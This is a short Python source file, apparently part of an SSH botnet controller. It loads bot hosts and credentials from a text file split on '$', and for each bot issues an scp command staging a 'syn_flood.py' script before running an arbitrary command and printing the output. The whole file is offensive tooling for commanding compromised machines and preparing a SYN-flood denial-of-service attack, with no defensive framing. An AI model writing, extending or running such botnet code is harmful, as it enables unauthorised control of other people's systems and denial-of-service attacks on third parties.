from sshBot import Client
from multiprocessing import Process
class Command:
    def botnetCommand(command, botNet):
        for client in botNet:
            client.send_command("scp syn_flood.py $HOME/")
            output = client.send_command(command)
            print('[*] Output from ' + client.host)
            print('[+] ' + str(output, encoding='utf-8') + '\n')

    def addClient():
        f = open("botlist.txt", "r")
        listBot = []
        for i in f.readlines():
            result = i.split("$")
            client = Client(result[0], result[1], result[2])
            # session = Process(target=)
            listBot.append(client)
        return listBot
